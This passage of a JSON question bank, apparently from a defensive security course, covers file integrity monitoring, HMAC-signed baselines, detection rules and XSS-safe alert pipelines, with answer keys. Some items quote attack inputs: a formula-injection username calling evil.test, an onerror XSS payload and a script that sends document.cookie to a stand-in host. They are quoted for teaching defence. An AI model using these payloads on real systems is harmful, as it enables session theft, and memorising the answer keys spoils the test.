      "A strict Content Security Policy (CSP) header blocking inline scripts (e.g., `script-src 'self'`)",
      "Disabling HTTPS on internal dashboards",
      "Truncation to 10 characters with `limit=10`"
    ],
    "correct": 1,
    "explanation": "Strict CSP acts as defense-in-depth alongside output escaping (`html.escape`) and ingestion validation."
  },
  {
    "id": "q_c4_m7_090",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Suppose an attacker creates an SSH user named `=WEBSERVICE('https://evil.test')` which passes cleanly through `sanitise()` (no control characters) and `html.escape()`. Which export pipeline in your SOC still remains vulnerable unless guarded separately (`Module 3` + `Module 7`)?",
    "options": [
      "SHA-256 baseline hashing",
      "`alerts.jsonl` when validated with `json.loads()`",
      "Terminal console `print()` on Linux",
      "Exporting alerts into `.csv` opened in spreadsheet software (CSV/formula injection unless prefixed via `safe_cell()`)"
    ],
    "correct": 3,
    "explanation": "Spreadsheet programs treat leading `=`, `+`, `-`, `@` as formulas unless escaped (`'`), reinforcing why every consumer format needs its own safe encoder."
  },
  {
    "id": "q_c4_m7_091",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "In `sanitise(text: str, limit: int = 80) -> str`, what purpose does slicing `[:limit]` serve?",
    "options": [
      "Computes an 80-bit cryptographic hash",
      "Bounds field lengths cleanly to prevent attacker-supplied megabyte strings from bloating alert payloads, terminals, or UI tables",
      "Caps total alerts per hour at 80",
      "Strips lowercase letters beyond byte 80"
    ],
    "correct": 1,
    "explanation": "Bounding extracted strings protects log pipelines, UI layouts, and downstream webhooks from payload-flooding fields."
  },
  {
    "id": "q_c4_m7_092",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Look at `json.dumps(alert, ensure_ascii=True)` vs. `print(f'{alert}')` when writing `alerts.jsonl`: why is writing raw Python `str(alert)` or unescaped text dangerous for automated log parsers?",
    "options": [
      "`json.dumps()` compresses timestamps automatically",
      "`str(alert)` deletes `\\n` automatically",
      "`repr(alert)` executes `alert['entity']` via `eval`",
      "Python `repr()` outputs single quotes, invalid JSON booleans (`True`/`False` vs `true`/`false`), and cannot be parsed safely via `json.loads()`"
    ],
    "correct": 3,
    "explanation": "Valid machine-readable JSON Lines (`alerts.jsonl`) requires `json.dumps()`, never Python dictionary `str()` representations."
  },
  {
    "id": "q_c4_m7_093",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "What ASCII hexadecimal byte represents the `DEL` control character stripped cleanly by `[\\x00-\\x1f\\x7f]` inside `sanitise()`?",
    "options": [
      "`0x1b` (decimal 27, ESC)",
      "`0x7f` (decimal 127)",
      "`0x0a` (decimal 10, LF)",
      "`0x20` (decimal 32, Space)"
    ],
    "correct": 1,
    "explanation": "Control bytes encompass `0x00–0x1F` plus `0x7F` (`DEL`), leaving space (`0x20`) through `0x7E` untouched."
  },
  {
    "id": "q_c4_m7_094",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Suppose an attacker includes Unicode Bidirectional Override characters (e.g., `U+202E` right-to-left override) inside a malicious filename or username to disguise `.exe` visually as `txt`. How does `json.dumps(..., ensure_ascii=True)` behave toward `U+202E`?",
    "options": [
      "`re.sub(r'[\\x00-\\x1f\\x7f]')` already deletes `U+202E`",
      "`ensure_ascii=True` silently deletes Unicode characters above `U+00FF`",
      "`ensure_ascii=True` swaps left-to-right terminal flags automatically",
      "`ensure_ascii=True` emits literal `\\u202e` in `alerts.jsonl` so reviewers inspecting JSON see the hidden bidi control code explicitly instead of rendered spoofed order"
    ],
    "correct": 3,
    "explanation": "Visual Trojan Source / bidi spoofing escapes via `\\u202e` cleanly under `ensure_ascii=True`, exposing sneaky non-ASCII characters inside machine JSON logs."
  },
  {
    "id": "q_c4_m7_095",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "If an attacker sends username `<img src=x onerror=alert(1)>` into an HTML alert table, why does `html.escape(entity, quote=True)` neutralize it completely cleanly just like `<script>`?",
    "options": [
      "Because `html.escape` blacklists only the exact string `script`",
      "Converting `<` and `>` to `&lt;` and `&gt;` prevents the browser HTML parser from creating an `<img>` element or parsing `onerror` attributes altogether",
      "Because browsers disable `<img>` tags inside `<table>`",
      "Because `quote=True` deletes `onerror=` words"
    ],
    "correct": 1,
    "explanation": "Character entity encoding neutralizes ALL HTML elements and event-handler injection vectors uniformly rather than fragile keyword blacklisting."
  },
  {
    "id": "q_c4_m7_096",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Why should you NEVER trust `'sanitise(user_input)'` running once on raw ingestion to automatically substitute for `html.escape()` inside your HTML reporter later?",
    "options": [
      "Because `html.escape()` removes valid SHA-256 characters",
      "`html.escape()` throws errors unless text was never run through `re.sub()`",
      "Because `sanitise()` adds HTML tags automatically",
      "Ingestion regex checks may miss new contexts (HTML vs URL vs CSV), whereas contextual output escaping at the exact sink guarantees safety for that format"
    ],
    "correct": 3,
    "explanation": "Output encoding belongs directly at each rendering boundary (`html.escape` for HTML, CSV guard for spreadsheets, JSON serializer for structured telemetry)."
  },
  {
    "id": "q_c4_m7_097",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "Look at `m07_defensive.py` execution output `3. alerts.jsonl lines: 3 | sanitised entity: svc?[31mbackup`. How was that confirmation line generated?",
    "options": [
      "Executing a live SSH command against `localhost`",
      "Reading back the written `alerts.jsonl` lines, counting them (`3`), and parsing the last alert's `entity` (`svc?[31mbackup`) with `json.loads`",
      "Printing `rules[2]['re'].pattern`",
      "Hashing `alerts.jsonl` with MD5"
    ],
    "correct": 1,
    "explanation": "The script writes `alerts.jsonl`, reads lines back, validates JSON parsing via `json.loads`, and verifies control-character neutering."
  },
  {
    "id": "q_c4_m7_098",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Why does a test in Practical P2 explicitly feed an alert containing `entity = '<script>alert(1)</script>'` through your HTML table renderer and assert `'&lt;script&gt;' in html_out` and `'<script>' not in html_out`?",
    "options": [
      "To confirm CSS styles load cleanly",
      "To verify `sanitise()` strips angle brackets",
      "Because `unittest` treats raw `<script>` strings as syntax errors",
      "Automated positive/negative security assertions prevent a future template refactor from silently reverting back to raw unescaped HTML interpolation"
    ],
    "correct": 3,
    "explanation": "Automated regression tests over XSS escaping verify the exact rendered HTML boundary remains hardened across edits."
  },
  {
    "id": "q_c4_m7_099",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "Following `C04-M07-F3` (Safe Alert Pipeline), why does an alert emitter sign or ship alerts over TLS with authentication rather than unauthenticated plain UDP syslog when traversing untrusted networks?",
    "options": [
      "UDP syslog drops JSON newlines past 20 bytes",
      "Plain UDP syslog lacks encryption, confidentiality, and delivery authenticity—letting on-path attackers read sensitive incident details or forge fake alerts",
      "UDP automatically executes ANSI control codes on routers",
      "Because Python `socket` forbids UDP on loopback"
    ],
    "correct": 1,
    "explanation": "Transport security + authentication stops alert interception, spoofing, and silent packet loss across networks."
  },
  {
    "id": "q_c4_m7_100",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Suppose `text` passed to `sanitise(text, limit=80)` contains an unescaped NUL byte (`\\x00`) embedded mid-string by a binary protocol fuzzer. What happens cleanly?",
    "options": [
      "`sanitise()` raises `ValueError` on null bytes",
      "`\\x00` terminates Python strings before `re.sub` runs",
      "`json.dumps()` drops keys containing `\\x00`",
      "`re.sub(r'[\\x00-\\x1f\\x7f]', '?', text)` replaces `\\x00` with `?`, preventing C-library truncation surprises in downstream parsers or displays"
    ],
    "correct": 3,
    "explanation": "Replacing `\\x00` (inside `\\x00-\\x1f`) prevents null-byte string-truncation mismatches between Python and downstream C/shell tools."
  },
  {
    "id": "q_c4_m7_101",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "In Scenario S1, a new FIM deployment reports **4,000 changed files every night** across a web application host. What is the correct FIRST investigative step?",
    "options": [
      "Turn off SHA-256 and compare file extensions only",
      "Immediately exclude the entire `/var/www/` folder with `--exclude '*'`",
      "Schedule `fim.py accept` right before `check` every night",
      "Inspect the unfiltered diffs carefully to distinguish legitimate volatile writes (rotating logs, caches, uploads) from unauthorized code or binary changes before excluding anything"
    ],
    "correct": 3,
    "explanation": "Triage genuine vs. volatile diffs first so an actual compromise hiding inside the 4,000 nightly noise files is never muted blindly."
  },
  {
    "id": "q_c4_m7_102",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "After identifying that user file uploads and transient cache files drive the 4,000 nightly alerts in Scenario S1, why is moving upload/cache folders OUTSIDE monitored executable roots superior to adding `--exclude '*.php'` or excluding whole upload dirs silently?",
    "options": [
      "Moving folders shrinks SHA-256 hash compute time to zero everywhere",
      "Separating mutable user data onto its own unexecuted directory/mount prevents mixing user uploads with application binaries while keeping the code tree strictly monitored without dangerous extension wildcards",
      "Because `fnmatch` cannot exclude files inside subdirectories",
      "Because web browsers refuse serving files outside `/var/www/` unless `exclude` runs"
    ],
    "correct": 1,
    "explanation": "Clean filesystem architecture isolates immutable executable code from mutable user uploads, eliminating noisy exceptions cleanly."
  },
  {
    "id": "q_c4_m7_103",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "What is a **dead-man's switch** check in defensive sensor operations?",
    "options": [
      "A rule firing when `root` runs `rm -rf /tmp`",
      "A Python keyword that exits `finally:` blocks after 10 seconds",
      "An off-host monitor that alerts immediately whenever a host sensor misses its expected periodic heartbeat or signed check-in",
      "An automated script deleting logs when disk fills past 90%"
    ],
    "correct": 2,
    "explanation": "Because an intruder taking over a host often kills scheduled defenders, missing periodic heartbeats expose sensor tampering immediately."
  },
  {
    "id": "q_c4_m7_104",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "Compare two exit codes returned by Practical P1 (`fim.py check`): `exit 1` vs `exit 2`. Why must automated Task Scheduler or `cron` wrappers treat `1` and `2` differently?",
    "options": [
      "`exit 1` means zero changes while `exit 2` means changes found",
      "`exit 1` signals detected filesystem drift requiring security triage, whereas `exit 2` signals operational/integrity error (corrupt JSON, forged HMAC signature, unreadable path) requiring fail-closed investigation—neither may pass silently as `0`",
      "`exit 2` tells cron to run `fim.py accept` automatically",
      "Standard Unix pipelines treat any non-zero code as all-clear"
    ],
    "correct": 1,
    "explanation": "Explicit contracts (`0` clean, `1` diffs/findings, `2` failure/tamper error) prevent schedulers from silently assuming tampered sensors found nothing."
  },
  {
    "id": "q_c4_m7_105",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "In Step 4 of `m07_defensive.py`, why does the script recursively unlink created files (`sshd_config`, `hosts`, `cron.evil`, `baseline.json`, `alerts.jsonl`) and remove its temp directory cleanly (`cleaned up: True`)?",
    "options": [
      "Automated defensive scripts and lab tests must leave zero orphaned scratch artifacts behind on host disks",
      "To verify `fim.py` reports all files as `'removed'` before quitting",
      "Because Python raises `MemoryError` if `tempdir` remains on exit",
      "To delete the user's real `/etc/hosts` file"
    ],
    "correct": 0,
    "explanation": "Explicit cleanup prevents recurring scheduled jobs and tests from exhausting `/tmp` or `%TEMP%` storage over time."
  },
  {
    "id": "q_c4_m7_106",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "Suppose an engineer deploys a scheduled FIM script under a dedicated account that has READ-ONLY access to `/etc` and `/var/www/html`, zero sudo privileges, and pushes baselines over TLS to an append-only central endpoint. Which compromise scenario does least privilege neutralize immediately?",
    "options": [
      "It eliminates the need for HMAC signing completely",
      "It stops remote attackers from port scanning port 22",
      "It enables `www-data` to edit `/etc/shadow` safely",
      "If a vulnerability in the FIM parser or regex engine itself were exploited, the compromised FIM process cannot overwrite system binaries, alter web code, or delete prior off-host alerts"
    ],
    "correct": 3,
    "explanation": "Even security tooling can harbor bugs; least-privilege OS permissions + append-only remote sinks contain parser-exploit blast radius."
  },
  {
    "id": "q_c4_m7_107",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "In Practical P1, during authorized software patching, how should deployment pipelines integrate with FIM (`init`/`check`/`accept`) so legitimate updates don't spam alerts next morning?",
    "options": [
      "Configure `fim.py check` to overwrite mismatched hashes automatically",
      "Delete `fim.py` from Task Scheduler permanently",
      "Execute `fim.py accept` using the authorized off-host signing key cleanly as a gated final step after verified deployment completion",
      "Exclude `/usr/bin/*` and `/var/www/*` permanently"
    ],
    "correct": 2,
    "explanation": "Integrating controlled `accept` baseline renewal into change-approved deployments preserves high-signal FIM monitoring afterward."
  },
  {
    "id": "q_c4_m7_108",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "In Practical P2 (`Detection-as-Code verification`), what happens if unit tests cover ONLY known-bad sample logs (asserting `RK-001..RK-004` fire) and omit known-good baseline tests?",
    "options": [
      "Negative tests fail silently unless thresholds equal zero",
      "An overly broad regex change (like accidentally matching all SSH traffic instead of only `root` logins) passes every positive test while flooding production SOC with 100% false positives",
      "`unittest` blocks suites missing negative tests at syntax level",
      "Suppression stops working during real attacks"
    ],
    "correct": 1,
    "explanation": "Both known-bad (must alert) and known-good (must NOT alert) tests are required to prove rule precision and prevent noisy regressions."
  },
  {
    "id": "q_c4_m7_109",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "Which standard Windows and Linux scheduling mechanisms (taught in Course 03 & Module 4) run automated `fim.py check` sweeps periodically?",
    "options": [
      "Windows Task Scheduler on Windows; `cron` or `systemd` timers on Linux",
      "`unittest` and `argparse`",
      "`hmac` and `hashlib`",
      "`Wireshark` packet capture loops"
    ],
    "correct": 0,
    "explanation": "Task Scheduler, `cron`, and `systemd` timers automate unattended periodic defensive sweeps safely when given explicit absolute paths and timeouts."
  },
  {
    "id": "q_c4_m7_110",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "Why must scheduled defensive jobs clean up temporary test artifacts cleanly inside `try ... finally:` blocks (as seen in `m07_defensive.py` Step 4) rather than at the bottom after `print()`?",
    "options": [
      "`try ... finally:` converts exit code `2` into `0`",
      "`finally:` encrypts temporary directories before deletion",
      "Python skips code after `json.dumps()` unless inside `finally:`",
      "If an intermediate verification fails or raises an exception early, `finally:` still executes guaranteed cleanup so temp keys or files never linger"
    ],
    "correct": 3,
    "explanation": "`finally:` runs even on unexpected mid-run errors, ensuring temporary keys, test baselines, and scratch files never pile up."
  },
  {
    "id": "q_c4_m7_111",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "When Practical P1 compares `size` and `mtime` alongside `sha256`, why is `'sha256'` still computed on initial `init` and during `accept` for all non-excluded files?",
    "options": [
      "`size` cannot distinguish empty files from 1-byte files",
      "Because `mtime` only holds integer minutes in Python",
      "Baseline manifests must hold authoritative SHA-256 ground truth so future checks can verify full cryptographic integrity",
      "JSON ignores numeric keys unless paired with hex strings"
    ],
    "correct": 2,
    "explanation": "Initial and accepted baselines record full content hashes cleanly as the ground-truth reference."
  },
  {
    "id": "q_c4_m7_112",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "Let $O$ hold 500 keys and $N$ hold 500 keys (`|O \\cap N| = 498`). How many total file paths reside in `Added`, `Removed`, and `O \\cup N`?",
    "options": [
      "`Added = 0`, `Removed = 0`, and `|O \\cup N| = 500`",
      "`Added = 2`, `Removed = 2`, and `|O \\cup N| = 502`",
      "`Added = 4`, `Removed = 0`, and `|O \\cup N| = 504`",
      "`Added = 2`, `Removed = 4`, and `|O \\cup N| = 498`"
    ],
    "correct": 1,
    "explanation": "Added = 500 - 498 = 2; Removed = 500 - 498 = 2; Union = 498 + 2 + 2 = 502."
  },
  {
    "id": "q_c4_m7_113",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "What happens in `m07_defensive.py` if an attacker leaves `baseline.json` untouched on disk and modifies `/etc/ssh/sshd_config` to allow `PermitRootLogin yes`?",
    "options": [
      "`baseline.json` HMAC still verifies `True`, and `compare(base, now)` immediately detects `'sshd_config'` in `'modified'` because disk hash differs from baseline hash",
      "Both `tampered baseline valid` and `compare` silently return `False`",
      "`sign()` blocks reading `/etc/ssh/sshd_config`",
      "`hosts` is reported in `'modified'` instead"
    ],
    "correct": 0,
    "explanation": "Valid signed baseline guarantees authoritative history, allowing `compare` to isolate `'sshd_config'` tampering cleanly."
  },
  {
    "id": "q_c4_m7_114",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "What subtle attack attempts to bypass `json.dumps(raw['files'], sort_keys=True)` envelope validation if a parser fails to decode JSON strictly (e.g., duplicate JSON object keys inside `baseline.json`)?",
    "options": [
      "`sort_keys=True` forces JSON duplicates to raise `SyntaxError`",
      "Duplicate JSON keys bypass SHA-256 bit lengths",
      "Python's `hmac.new` computes signatures faster on unsorted keys",
      "Canonical re-serialization of `raw['files']` collapses any parser duplicate keys consistently before verifying HMAC against the post-parsed Python `dict` being compared"
    ],
    "correct": 3,
    "explanation": "Signing and verifying the exact parsed dictionary passed into `compare()` (`raw['files']`) guarantees verified and compared data match 1-to-1."
  },
  {
    "id": "q_c4_m7_115",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "Which rule ID in `m07_defensive.py` fires on `Accepted publickey for root from 203.0.113.7 port 5000`?",
    "options": [
      "`RK-003` (`Local user created`, severity `'medium'`, threshold `1`)",
      "`RK-002` (`Multiple sudo failures`, severity `'medium'`, threshold `3`)",
      "`RK-001` (`Root SSH login`, severity `'high'`, threshold `1`)",
      "None, because `port 5000` is missing in `RULES`"
    ],
    "correct": 2,
    "explanation": "`RK-001` matches `Accepted \\S+ for root from (?P<ip>\\S+)`, capturing `'203.0.113.7'` immediately."
  },
  {
    "id": "q_c4_m7_116",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "In `RK-003`, notice `re.compile(r'useradd\\[\\d+\\]: new user: name=(?P<user>[^,]+)')`. Suppose an attacker injects a literal comma into an account creation tool log somehow (`name=bob,evil, UID=1001`). How does `[^,]+` match?",
    "options": [
      "It matches `'bob,evil, UID=1001'` across the whole string",
      "Non-greedy up to the first comma (`'bob'`), rather than swallowing `, UID=1001` cleanly into the user identifier",
      "It throws `re.error` on commas",
      "It strips commas automatically via `sanitise`"
    ],
    "correct": 1,
    "explanation": "Negated class `[^,]+` stops cleanly at the very first comma delimiter (`'bob'`)."
  },
  {
    "id": "q_c4_m7_117",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "In `m07_defensive.py`, how many total alerts are raised across the 7 synthetic `LOG` entries (`alerts raised: N`)?",
    "options": [
      "`3` (`RK-001`, `RK-002`, and `RK-003` once each)",
      "`7` (one per log entry)",
      "`5` (suppressing only `RK-001`)",
      "`1` (`RK-003` only)"
    ],
    "correct": 0,
    "explanation": "Verified execution output prints `2. alerts raised: 3` (`RK-001 high 203.0.113.7`, `RK-002 medium ben`, `RK-003 medium svc?[31mbackup`)."
  },
  {
    "id": "q_c4_m7_118",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "Why must an alert collector apply rate limiting IN ADDITION to per-`(rule_id, entity)` suppression when facing distributed attacks?",
    "options": [
      "Suppression windows fail when timestamps exceed 10 minutes",
      "Per-entity suppression works only when `threshold >= 5`",
      "Rate limiting resets HMAC tags safely",
      "If 50,000 distinct attacker IPs trigger `RK-001` once each, per-`(rule, entity)` suppression lets all 50,000 fire immediately because every entity is unique—only global/channel rate limiting + aggregation caps outbound floods"
    ],
    "correct": 3,
    "explanation": "Unique-entity attacks (50,000 botnet IPs) bypass per-entity deduplication cleanly unless paired with global channel rate limits and summary rollups."
  },
  {
    "id": "q_c4_m7_119",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "Why should defensive scripts never interpolate untrusted event strings directly inside HTML email bodies or dashboards (`f'<p>{user}</p>'`)?",
    "options": [
      "Emails reject strings lacking `utf-8` BOM headers",
      "HTML tags break `json.dumps(ensure_ascii=True)`",
      "Without `html.escape()`, `<script>` or HTML event payloads in attacker-controlled usernames trigger XSS inside the analyst's viewer",
      "`user` might contain spaces"
    ],
    "correct": 2,
    "explanation": "Raw HTML string formatting grants attackers arbitrary script or markup control inside security operator consoles."
  },
  {
    "id": "q_c4_m7_120",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Suppose an operator views `alerts.jsonl` using a plain CLI script reading JSON strings and calling `print(alert['entity'])` without first sanitising `entity` at ingestion. What threat persists if an upstream ingestion bug lets raw `\\x1b[2J` clear-screen sequences enter `alerts.jsonl`?",
    "options": [
      "`json.loads()` removes `\\x1b` bytes automatically",
      "Printing unsanitised `entity` into a terminal still renders raw ANSI escape sequences (`ESC[2J` wiping prior alerts off screen); running `sanitise()` both at ingestion AND display provides defense in depth",
      "Modern terminals disable all escape codes inside `print()`",
      "`ensure_ascii=True` removes `\\u001b` upon `json.loads()`"
    ],
    "correct": 1,
    "explanation": "`json.loads()` decodes `\\u001b` right back to raw `0x1B` in Python memory—terminals will interpret it unless sanitised before console output."
  },
  {
    "id": "q_c4_m7_121",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "medium",
    "q": "In Practical P1, why should `fim.py check` exit `2` cleanly if `baseline.json` fails HMAC validation or fails JSON decoding?",
    "options": [
      "Fail-closed reporting prevents corrupted or tampered baselines from reporting clean exit `0`",
      "Exit `2` runs `unittest` automatically",
      "Exit `2` informs `cron` to suppress future jobs for 10 minutes",
      "Task Scheduler deletes `fim.py` on exit `1`"
    ],
    "correct": 0,
    "explanation": "Distinct error status `2` isolates broken/tampered baselines from clean (`0`) or normal change diffs (`1`)."
  },
  {
    "id": "q_c4_m7_122",
    "topic": "C04-M07-L06: Deploying Sensors & Practical Workflows",
    "difficulty": "difficult",
    "q": "Which combination BEST eliminates false alarms from legitimate OS package updates while stopping persistent backdoors on web servers?",
    "options": [
      "Hashing only `mtime` and ignoring binary bytes",
      "Local writable `baseline.json` + hourly automatic `accept` before `check`",
      "Excluding `/etc` and `/var/www` from all checks",
      "Off-host signed FIM baselines + strict exclusion only of separated mutable cache/log dirs + `accept` hook inside approved change/deployment pipelines + dead-man heartbeat"
    ],
    "correct": 3,
    "explanation": "Tying controlled baseline acceptance strictly to approved deployments while guarding the sensor externally resolves noise without sacrificing defense."
  },
  {
    "id": "q_c4_m7_123",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "medium",
    "q": "Why does `snapshot()` pass `b''` as the sentinel in `iter(lambda: fh.read(65536), b'')`?",
    "options": [
      "`b''` skips null bytes cleanly",
      "`b''` initializes `hashlib.sha256` to zero",
      "`fh.read(65536)` returns empty bytes `b''` at EOF, terminating the chunk iteration cleanly",
      "`iter()` ignores empty files unless passed `b''`"
    ],
    "correct": 2,
    "explanation": "Two-argument `iter(callable, sentinel)` invokes the lambda repeatedly until EOF returns `b''`."
  },
  {
    "id": "q_c4_m7_124",
    "topic": "C04-M07-L01: FIM Concepts & Change Sets",
    "difficulty": "difficult",
    "q": "Suppose `old` holds `{f'f{i}': 'a'*64 for i in range(100)}` and `new` deletes 5 files and creates 7 new files while changing 4 digests among the remaining 95. Check `|Added| + |Removed| + |Modified| + |Unchanged|`:",
    "options": [
      "`7 + 5 + 4 + 84 = 100`",
      "`7 + 5 + 4 + 91 = 107`, matching `|old.keys() | new.keys()|`",
      "`5 + 7 + 95 + 4 = 111`",
      "`7 + 5 + 91 = 103`"
    ],
    "correct": 1,
    "explanation": "95 remaining files split into 4 modified + 91 unchanged; union size is 100 + 7 added = 107 (`7+5+4+91=107`)."
  },
  {
    "id": "q_c4_m7_125",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "medium",
    "q": "Look at `m07_defensive.py`: when simulating tampering on `baseline.json`, what line changed the signed manifest?",
    "options": [
      "`tampered['files']['sshd_config'] = '0' * 64`",
      "`tampered['sig'] = 'f' * 64`",
      "`tampered['files']['hosts'] = 'deleted'`",
      "`tampered['root'] = '/tmp'`"
    ],
    "correct": 0,
    "explanation": "Overwriting `'sshd_config'`'s SHA-256 string inside `'files'` without re-signing caused verification against `tampered['sig']` to return `False`."
  },
  {
    "id": "q_c4_m7_126",
    "topic": "C04-M07-L02: Signing Baselines & Trust Boundaries",
    "difficulty": "difficult",
    "q": "What if a naive verifier checks `valid = (raw['sig'] == sign(raw['files'], key))` AND forgets to verify whether `raw['files']` might hold nested unverified keys like `'__comment__'`?Wait—if `sign` hashes ALL of `raw['files']`, can an attacker inject any unauthenticated entry inside `raw['files']` without changing `sign(raw['files'], key)`?",
    "options": [
      "Only if the value is an integer",
      "Yes — extra keys ignored by `compare` bypass `sort_keys=True`",
      "Yes — comments starting with `#` are skipped by `json.dumps`",
      "No — `sign` serializes the entire `raw['files']` subtree, so adding even one unauthenticated key alters canonical bytes and fails HMAC"
    ],
    "correct": 3,
    "explanation": "Signing the complete `'files'` map binds every single key and value inside it to the HMAC tag."
  },
  {
    "id": "q_c4_m7_127",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "medium",
    "q": "In `m07_defensive.py`, why is `re.compile(...)` called once when defining `RULES` rather than inside `for offset_s, msg in LOG:`?",
    "options": [
      "Named capture groups require `re.compile()`",
      "`re.search()` forbids raw strings inside loops",
      "Compiling patterns once avoids re-parsing regex ASTs on every log line across thousands or millions of events",
      "Compiled regexes automatically strip control characters"
    ],
    "correct": 2,
    "explanation": "Pre-compiling detection regexes delivers higher scanning throughput and catches syntax bugs cleanly upfront."
  },
  {
    "id": "q_c4_m7_128",
    "topic": "C04-M07-L03: Declarative Rules & Entity Keying",
    "difficulty": "difficult",
    "q": "In Practical P2 (`rules.json`), examine why `rules.json` stores `'pattern': '...'` as a JSON string while runtime code stores `'re': re.compile(...)` in memory. What happens if someone tries to call `json.dumps(RULES)` containing compiled `re.Pattern` objects?",
    "options": [
      "`json.dumps()` serializes compiled patterns back into raw strings seamlessly",
      "`TypeError: Object of type Pattern is not JSON serializable` — compiled regex objects stay in-memory runtime structures loaded from JSON string `'pattern'` fields",
      "`sort_keys=True` bypasses `re.Pattern` types",
      "`Pattern` serializes as a hexadecimal digest"
    ],
    "correct": 1,
    "explanation": "On-disk catalogs hold plain JSON strings (`pattern`); the engine validates and compiles them into in-memory `re.Pattern` objects at startup."
  },
  {
    "id": "q_c4_m7_129",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "medium",
    "q": "At offset `+25s` inside `m07_defensive.py` (`sudo: ... user=ben`), why was NO alert emitted even though `'RK-002'` matched the log line?",
    "options": [
      "`counts[('RK-002', 'ben')]` reached `2`, which is still below `'RK-002'`'s threshold of `3`",
      "Suppression muted `+25s` cleanly",
      "`sanitise()` rejected `'ben'`",
      "Offsets under 30 seconds are skipped"
    ],
    "correct": 0,
    "explanation": "Event +20s increments count to 1, event +25s increments count to 2 (`2 < 3`), and event +30s hits `3 >= 3` to emit Alert 2."
  },
  {
    "id": "q_c4_m7_130",
    "topic": "C04-M07-L04: Thresholds & Alert Suppression",
    "difficulty": "difficult",
    "q": "Suppose an attacker probes `sudo` passwords precisely once every `11 minutes` (`threshold=3`, sliding window=`5 minutes`, `SUPPRESS=10 minutes`). What occurs cleanly under the upgraded Practical P2 sliding-window detector vs. the basic lifetime counter?",
    "options": [
      "The sliding-window detector alerts on every single attempt (`count=1`)",
      "Both trigger identically at 22 minutes",
      "Neither triggers because 11 minutes > 10-minute suppression",
      "The sliding-window detector expires each old failure before 11 minutes elapse (staying at count 1 per window, never firing), whereas the unwindowed lifetime counter fires at minute 22"
    ],
    "correct": 3,
    "explanation": "Window size limits how far back threshold bursts correlate; spacing attempts past the window prevents false triggers unless thresholds or windows intentionally track slow-and-low probes."
  },
  {
    "id": "q_c4_m7_131",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "medium",
    "q": "What characters remain untouched by `re.sub(r'[\\x00-\\x1f\\x7f]', '?', text)`?",
    "options": [
      "Terminal escape prefix `\\x1b` (`ESC`)",
      "Newlines (`\\n`) and carriage returns (`\\r`)",
      "Printable ASCII (`0x20` space through `0x7e` `~`) and standard multi-byte Unicode text outside ASCII control bytes",
      "`DEL` (`0x7f`) and `NUL` (`0x00`)"
    ],
    "correct": 2,
    "explanation": "Control range `0x00–0x1F` and `0x7F` converts to `?`, preserving ordinary printable strings and digits untouched."
  },
  {
    "id": "q_c4_m7_132",
    "topic": "C04-M07-L05: Safe Alert Pipelines & XSS Defense",
    "difficulty": "difficult",
    "q": "Suppose an attacker supplies `<script>fetch('https://x.test/?c='+document.cookie)</script>` in a failed SSH username that hits an internal SIEM alert report HTML page. Which exact output produces safe visible cells without dropping the evidence of what was attempted?",
    "options": [
      "Dropping the entire alert whenever `<` appears",
